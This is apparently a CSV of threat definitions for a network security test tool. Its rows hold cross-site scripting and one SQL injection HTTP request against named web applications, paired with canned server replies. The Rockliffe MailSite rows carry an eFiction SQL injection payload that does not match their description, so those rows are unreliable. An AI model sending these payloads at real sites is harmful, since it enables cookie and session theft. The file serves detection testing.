XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
ideocontent_xss_IPv6.xml," IdeoContent Manager news_full.php page Variable XSS (IPv6 Version)",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ideocontent_xss_b.xml," IdeoContent Manager Index.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"GET /news_full.php?&page=2""><script>alert(document.cookie)</script> HTTP/1.0[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.12) Gecko/20051020 Epiphany/1.8.2[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300..Connection: keep-alive..Cache-Control: max-age=0[[0D 0A 0D 0A]]"
ideocontent_xss_b.xml," IdeoContent Manager Index.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ideocontent_xss_b_IPv6.xml," IdeoContent Manager Index.php page Variable XSS (IPv6 Version)",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /news_full.php?&page=2""><script>alert(document.cookie)</script> HTTP/1.0[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.12) Gecko/20051020 Epiphany/1.8.2[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300..Connection: keep-alive..Cache-Control: max-age=0[[0D 0A 0D 0A]]"
ideocontent_xss_b_IPv6.xml," IdeoContent Manager Index.php page Variable XSS (IPv6 Version)",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ie7_jpg_xss.xml,IE7 Malformed Image XSS,This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80.,HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
ie7_jpg_xss.xml,IE7 Malformed Image XSS,This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Thu, 26 Oct 2006 19:23:56 GMT[[0D 0A ]]Server: Apache/1.3.33 (Unix)[[0D 0A ]]Last-Modified: Wed, 25 Oct 2006 22:47:44 GMT[[0D 0A ]]ETag: ""33d8284-73-453fe990""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 115[[0D 0A ]]Content-Type: image/jpeg[[0D 0A 0D 0A ]]GIF89a[[01 00 01 00 ]]<HTML><HEAD><SCRIPT>alert('Congrats for using a browser that is proven to suck!');</SCRIPT></HEAD></HTML>"
﻿ie7_jpg_xss_IPv6.xml,IE7 Malformed Image XSS (IPv6 Version),This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
ie7_jpg_xss_IPv6.xml,IE7 Malformed Image XSS (IPv6 Version),This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Thu, 26 Oct 2006 19:23:56 GMT[[0D 0A ]]Server: Apache/1.3.33 (Unix)[[0D 0A ]]Last-Modified: Wed, 25 Oct 2006 22:47:44 GMT[[0D 0A ]]ETag: ""33d8284-73-453fe990""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 115[[0D 0A ]]Content-Type: image/jpeg[[0D 0A 0D 0A ]]GIF89a[[01 00 01 00 ]]<HTML><HEAD><SCRIPT>alert('Congrats for using a browser that is proven to suck!');</SCRIPT></HEAD></HTML>"
﻿litespeed_xss.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80.,HTTP,TCP,GET /admin/config/confMgr.php?m=al_adminListener%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0[[0D 0A 0D 0A]]
litespeed_xss.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿litespeed_xss_IPv6.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /admin/config/confMgr.php?m=al_adminListener%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0[[0D 0A 0D 0A]]
litespeed_xss_IPv6.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿mailsite_xss.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90.,HTTP,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0[[0D 0A 0D 0A]]"
mailsite_xss.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿mailsite_xss_IPv6.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS (IPv6 Version)",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90. (IPv6 Version),HTTP/IPv6,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0[[0D 0A 0D 0A]]"
mailsite_xss_IPv6.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS (IPv6 Version)",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿miniwebshop_xss.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80.
",HTTP,TCP,GET /miniwebshop/modules/viewcategory.php?catname='><script>alert(document.cookie)</script> HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
miniwebshop_xss.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80.
",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿miniwebshop_xss_IPv6.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability (IPv6 Version),"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,GET /miniwebshop/modules/viewcategory.php?catname='><script>alert(document.cookie)</script> HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
miniwebshop_xss_IPv6.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability (IPv6 Version),"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ned_xss.xml,Nokia Electronic Documentation Cross Site Scripting,This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing. ,HTTP,TCP,GET /docs/<script>alert('1mp3rf3ctR0x');</script> HTTP/1.0[[0D 0A 0D 0A]]
ned_xss.xml,Nokia Electronic Documentation Cross Site Scripting,This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing. ,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ned_xss_IPv6.xml,Nokia Electronic Documentation Cross Site Scripting (IPv6 Version),This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing.  (IPv6 Version),HTTP/IPv6,TCP,GET /docs/<script>alert('1mp3rf3ctR0x');</script> HTTP/1.0[[0D 0A 0D 0A]]
ned_xss_IPv6.xml,Nokia Electronic Documentation Cross Site Scripting (IPv6 Version),This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing.  (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿netgear_xss.xml,Netgear URL Filter Cross-Site Scripting Injection,"This threat sends a URL request for a file that should be filtered by a Netgear router.  The Netgear router in this instance will filter the request, block the URL, and enter an entry into its log.  However, this entry can be used as a vector of attack with cross site scripting injection.  When the log is later viewed by a user, the Javascript is executed with the privileges of the logged in user.",HTTP,TCP,GET /malware.exe</textarea><script>alert('imperfectRox')</script> HTTP/1.0[[0D 0A 0D 0A]]
netgear_xss.xml,Netgear URL Filter Cross-Site Scripting Injection,"This threat sends a URL request for a file that should be filtered by a Netgear router.  The Netgear router in this instance will filter the request, block the URL, and enter an entry into its log.  However, this entry can be used as a vector of attack with cross site scripting injection.  When the log is later viewed by a user, the Javascript is executed with the privileges of the logged in user.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿netgear_xss2.xml,Netgear URL Logging XSS,This threat sends a cross-site scripting attempt to a third party webpage.  The netgear URL filter logging process then places this output unfiltered in its log webpage.  This allows an attacker to execute arbitrary javascript with permissions of the administrator viewing the page.  This threat targets a webserver listening on port 80.,HTTP,TCP,GET / HTTP/1.0[[0D 0A ]]Host: </textarea><script>alert('XSS!blabla');[[0D 0A 0D 0A]]
netgear_xss2.xml,Netgear URL Logging XSS,This threat sends a cross-site scripting attempt to a third party webpage.  The netgear URL filter logging process then places this output unfiltered in its log webpage.  This allows an attacker to execute arbitrary javascript with permissions of the administrator viewing the page.  This threat targets a webserver listening on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿netgear_xss2_IPv6.xml,Netgear URL Logging XSS (IPv6 Version),This threat sends a cross-site scripting attempt to a third party webpage.  The netgear URL filter logging process then places this output unfiltered in its log webpage.  This allows an attacker to execute arbitrary javascript with permissions of the administrator viewing the page.  This threat targets a webserver listening on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A ]]Host: </textarea><script>alert('XSS!blabla');[[0D 0A 0D 0A]]
